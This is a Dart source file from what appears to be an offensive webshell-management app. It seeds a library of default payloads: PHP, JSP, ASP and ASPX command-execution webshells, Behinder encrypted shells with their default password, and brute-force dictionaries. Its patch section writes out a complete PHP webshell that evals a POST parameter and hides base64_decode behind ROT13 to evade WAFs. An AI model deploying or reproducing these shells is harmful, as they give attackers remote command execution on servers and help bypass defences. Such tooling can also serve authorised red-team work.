import 'package:flutter/services.dart';

import '../database/database_helper.dart';

/// 根据文件名推断字典分类
String _inferDictCategory(String name) {
  final lower = name.toLowerCase();
  if (lower.contains('password') || lower.contains('pass') || lower.contains('top100') || lower.contains('top200') || lower.contains('top1000')) return 'passwords';
  if (lower.contains('username') || lower.contains('user')) return 'usernames';
  if (lower.contains('subdomain')) return 'subdomains';
  return 'paths';
}

/// 内置默认数据种子化服务
/// 版本号递增时自动补充新增的默认条目
class SeedService {
  static const _kMetaKey = 'seed_version';
  static const _kCurrentVersion = 6;

  // ── Payload 分类 ─────────────────────────────────────────────────────────
  // 命名规则：{语言}_{技术}_{传参方式}
  //
  // PHP
  //   php_eval_post.php       — eval() + POST cmd
  //   php_passthru_req.php    — passthru() + REQUEST cmd
  //   php_probe_info.php      — phpinfo() 环境探测
  //   php_b64rot13_post.php   — base64+rot13 双重编码绕过
  // JSP
  //   jsp_runtime_get.jsp     — Runtime.exec() + GET cmd
  //   jsp_classloader_b64.jsp — ClassLoader 动态加载字节码（冰蝎风格）
  // ASP
  //   asp_wscript_get.asp     — WScript.Shell + GET cmd

  static const _defaultPayloads = [
    // ── PHP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/php_eval_post.php',
      name: 'php_eval_post.php',
      type: 'php',
      description: 'PHP eval() webshell，POST 参数 cmd，最基础的一句话木马',
      tags: 'php,eval,post,classic',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/php_passthru_req.php',
      name: 'php_passthru_req.php',
      type: 'php',
      description: 'PHP passthru() 命令执行，GET/POST 参数 cmd，回显直接输出',
      tags: 'php,passthru,request,cmd',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/php_probe_info.php',
      name: 'php_probe_info.php',
      type: 'php',
      description: 'phpinfo() 环境信息探测，用于确认目标 PHP 版本及配置',
      tags: 'php,phpinfo,probe,recon',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/php_b64rot13_post.php',
      name: 'php_b64rot13_post.php',
      type: 'php',
      description: 'ROT13 + Base64 双重编码绕过 WAF，POST 参数 cmd',
      tags: 'php,bypass,base64,rot13,waf',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/php_behinder.php',
      name: 'php_behinder.php',
      type: 'php',
      description: 'PHP 冰蝎 3.0（Behinder），AES 加密，func|params 格式，默认密码 rebeyond',
      tags: 'php,behinder,aes,encrypt,冰蝎',
      sinceVersion: 6,
    ),
    // ── JSP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/jsp_runtime_get.jsp',
      name: 'jsp_runtime_get.jsp',
      type: 'jsp',
      description: 'JSP Runtime.exec() 命令执行，GET 参数 cmd，/bin/bash -c',
      tags: 'jsp,runtime,exec,get,cmd',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/jsp_classloader_b64.jsp',
      name: 'jsp_classloader_b64.jsp',
      type: 'jsp',
      description: 'JSP ClassLoader 动态加载字节码（冰蝎风格），GET 参数 cmd 传 Base64 类文件',
      tags: 'jsp,classloader,bytecode,base64,behinder',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/jsp_behinder.jsp',
      name: 'jsp_behinder.jsp',
      type: 'jsp',
      description: 'JSP 冰蝎 3.0（Behinder），AES 加密，payload 只读 body 第一行，agent 读第二行取参',
      tags: 'jsp,behinder,aes,encrypt,冰蝎',
      sinceVersion: 5,
    ),
    // ── ASP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/asp_wscript_get.asp',
      name: 'asp_wscript_get.asp',
      type: 'asp',
      description: 'ASP WScript.Shell 命令执行，GET 参数 cmd，cmd.exe /c',
      tags: 'asp,wscript,shell,get,cmd',
    ),
    // ── ASPX ─────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/aspx_cmd_post.aspx',
      name: 'aspx_cmd_post.aspx',
      type: 'aspx',
      description: 'ASPX .NET Process 命令执行，GET/POST 参数 cmd，纯文本输出，支持 PowerShell',
      tags: 'aspx,dotnet,process,cmd,powershell,windows',
      sinceVersion: 2,
    ),
  ];

  /// 需要更新内容的已有默认 payload（修复 bug 或改进实现）
  /// content 直接硬编码，不依赖 rootBundle 缓存，确保 patch 内容正确
  static const _patchPayloads = [
    // ── 名称统一（旧版使用简短名，新版与 asset 文件名对齐）──────────────────
    _PayloadPatch(names: ['php_simple.php'],  newName: 'php_eval_post.php'),
    _PayloadPatch(names: ['php_cmd.php'],     newName: 'php_passthru_req.php'),
    _PayloadPatch(names: ['php_info.php'],    newName: 'php_probe_info.php'),
    _PayloadPatch(names: ['jsp_simple.jsp'],  newName: 'jsp_runtime_get.jsp'),
    _PayloadPatch(names: ['asp_simple.asp'],  newName: 'asp_wscript_get.asp'),
    // ── 内容修复 + 重命名 ────────────────────────────────────────────────
    // php_b64rot13：eval 不能作变量函数调用，改为 ROT13 混淆 base64_decode
    _PayloadPatch(
      names: ['php_bypass.php', 'php_b64rot13_post.php'],
      newName: 'php_b64rot13_post.php',
      content: '<?php\n'
          r"$f = str_rot13('onfr64_qrpbqr');" '\n'
          r"$q = $f($_POST['cmd']);" '\n'
          '@eval(\$q);\n'
          '?>\n',
    ),
  ];

  static const _defaultDicts = [
    _DictDef(
      asset: 'assets/defaults/dicts/top200_passwords.txt',
      name: 'top200_passwords.txt',
      category: 'passwords',
      description: '常见弱密码 TOP 200，涵盖数字、字母、常见组合及常用服务默认密码',
      tags: 'passwords,weak,common,top200',
    ),
    _DictDef(
      asset: 'assets/defaults/dicts/common_paths.txt',
      name: 'common_paths.txt',
      category: 'paths',
      description: '常见 Web 目录与敏感路径，含管理后台、配置文件、备份文件等',
      tags: 'paths,dirs,web,admin,backup',
    ),
    _DictDef(
      asset: 'assets/defaults/dicts/common_usernames.txt',
      name: 'common_usernames.txt',
      category: 'usernames',
      description: '常见系统与服务用户名，含操作系统内置账号、常见服务账号',
      tags: 'usernames,system,service,default',
    ),
    _DictDef(
      asset: 'assets/defaults/dicts/common_subdomains.txt',
      name: 'common_subdomains.txt',
      category: 'subdomains',
      description: '常见子域名前缀，适用于子域名枚举与 DNS 爆破',
      tags: 'subdomains,dns,recon,brute',
    ),
  ];

  /// 应用启动时调用，幂等；storedVersion < currentVersion 时补充新版本的条目
  static Future<void> seed(DatabaseHelper db) async {
    // Patch 检查每次启动都运行（与版本号无关），内容不一致时直接覆盖
    await _applyPatches(db);
    // 字典同步：每次启动检测 assets/defaults/dicts 变化，自动更新或新增
    await _syncDefaultDicts(db);

    final stored = await db.getMetaValue(_kMetaKey);
    final storedVersion = int.tryParse(stored ?? '0') ?? 0;
    if (storedVersion >= _kCurrentVersion) return;

    for (final def in _defaultPayloads) {
      // 只种子化本次升级新增的条目
      if (def.sinceVersion <= storedVersion) continue;
      try {
        // 统一按 UTF‑8 读取内置脚本，避免中文注释乱码
        final content = await rootBundle.loadString(def.asset);
        await db.createPayload(
          name: def.name,
          type: def.type,
          content: content,
          isDefault: true,
          description: def.description,
          tags: def.tags,
        );
      } catch (_) {
        // asset 缺失时跳过，不中断启动
      }
    }

    for (final def in _defaultDicts) {
      if (storedVersion >= 1) continue; // 字典仅在首次安装时种子化
      try {
        final data = await rootBundle.load(def.asset);
        final bytes = data.buffer.asUint8List();
        await db.createDictionary(
          name: def.name,
          category: def.category,
          bytes: bytes,
          isDefault: true,
          description: def.description,
          tags: def.tags,
        );
      } catch (_) {
        // asset 缺失时跳过
      }
    }

    await db.setMetaValue(_kMetaKey, '$_kCurrentVersion');
  }

  /// 每次启动检查内置 payload 名称/内容是否与预期一致，不一致则原地修复（幂等）
  static Future<void> _applyPatches(DatabaseHelper db) async {
    final existingPayloads = await db.getAllPayloads();

    // 1) 应用显式 Patch（重命名 / 内容修复）
    for (final patch in _patchPayloads) {
      for (final p in existingPayloads) {
        if (!patch.names.contains(p.name)) continue;
        final needsRename  = patch.newName != null && p.name != patch.newName;
        final needsContent = patch.content != null &&
            p.content.trim() != patch.content!.trim();
        if (!needsRename && !needsContent) break; // 已是正确状态
        try {
          await db.updatePayload(p.copyWith(
            name:      needsRename  ? patch.newName    : null,
            content:   needsContent ? patch.content    : null,
            updatedAt: DateTime.now(),
          ));
        } catch (_) {}
        break;
      }
    }

    // 2) 统一修复所有内置默认 payload 的内容编码
    //   （早期版本用 String.fromCharCodes 读取 asset，中文注释会乱码）
    final expectedContentByName = <String, String>{};
    for (final def in _defaultPayloads) {
      try {
        expectedContentByName[def.name] =
            await rootBundle.loadString(def.asset);
      } catch (_) {
        // 忽略缺失的 asset
      }
    }

    for (final p in existingPayloads) {
      final expected = expectedContentByName[p.name];
      if (expected == null) continue;
      if (!p.isDefault) continue;
      if (p.content.trim() == expected.trim()) continue;
      try {
        await db.updatePayload(p.copyWith(
          content: expected,
          updatedAt: DateTime.now(),
        ));
      } catch (_) {}
    }
  }

  /// 每次启动同步 assets/defaults/dicts 下的字典：检测文件变化并更新，新增的自动导入
  static Future<void> _syncDefaultDicts(DatabaseHelper db) async {
    try {
      final manifest = await AssetManifest.loadFromAssetBundle(rootBundle);
      final dictAssets = manifest
          .listAssets()
          .where((k) => k.startsWith('assets/defaults/dicts/'))
          .toList();

      final existingDicts = await db.getAllDictionaries();
      final dictByName = {for (final d in existingDicts) d.name: d};

      for (final assetPath in dictAssets) {
        final name = assetPath.split('/').last;
        if (name.isEmpty) continue;
        try {
          final data = await rootBundle.load(assetPath);
          final bytes = data.buffer.asUint8List();
          final fileSize = bytes.length;

          final existing = dictByName[name];
          if (existing != null) {
            if (existing.isDefault && existing.fileSize != fileSize) {
              await db.updateDictionaryContent(existing, bytes);
            }
          } else {
            final category = _dictDefCategory(name) ?? _inferDictCategory(name);
            final def = _findDictDef(name);
            await db.createDictionary(
              name: name,
              category: category,
              bytes: bytes,
              isDefault: true,
              description: def?.description,
              tags: def?.tags,
            );
          }
        } catch (_) {
          // asset 加载失败时跳过
        }
      }
    } catch (_) {
      // AssetManifest 不可用时静默跳过（如部分测试环境）
    }
  }

  static String? _dictDefCategory(String name) {
    for (final d in _defaultDicts) {
      if (d.name == name) return d.category;
    }
    return null;
  }

  static _DictDef? _findDictDef(String name) {
    for (final d in _defaultDicts) {
      if (d.name == name) return d;
    }
    return null;
  }
}

class _PayloadDef {
  final String asset;
  final String name;
  final String type;
  final String description;
  final String tags;
  /// 该条目从哪个 seed version 开始引入（用于增量种子化）
  final int sinceVersion;

  const _PayloadDef({
    required this.asset,
    required this.name,
    required this.type,
    required this.description,
    required this.tags,
    this.sinceVersion = 1,
  });
}

class _PayloadPatch {
  /// 匹配的 payload 名称列表（兼容不同版本的命名）
  final List<String> names;
  /// 统一后的正确名称（为 null 时不重命名）
  final String? newName;
  /// 期望的正确内容（为 null 时不更新内容）
  final String? content;

  const _PayloadPatch({
    required this.names,
    this.newName,
    this.content,
  });
}

class _DictDef {
  final String asset;
  final String name;
  final String category;
  final String description;
  final String tags;

  const _DictDef({
    required this.asset,
    required this.name,
    required this.category,
    required this.description,
    required this.tags,
  });
}
